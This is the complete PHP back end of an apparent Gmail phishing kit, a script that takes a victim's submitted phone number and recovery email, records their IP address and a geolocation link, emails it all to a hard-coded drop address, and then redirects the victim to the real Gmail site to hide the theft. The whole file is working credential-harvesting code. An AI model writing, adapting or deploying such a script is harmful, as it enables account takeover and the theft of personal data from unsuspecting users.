<?php
if(isset($_SERVER['HTTP_X_REAL_IP'])){
$ip = $_SERVER['HTTP_X_REAL_IP'];
}else{
$ip=$_SERVER['REMOTE_ADDR'];
}
$message .= "---------=RECOVERY=---------\n";
$message .= "phone number: ".$_POST['phoneNumber']."\n";
$message .= "recovery email: ".$_POST['recEmail']."\n";
$message .= "---------=IP Address & Date=---------\n";
$message .= "IP Address: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- Yankee [.] RU --------------|\n";
$send = "pedjohn45@gmail.com";
$subject = "GMAIL | $ip";
{
mail("$send", "$subject", $message);   
}
header ("Location: https://gmail.com/");
?>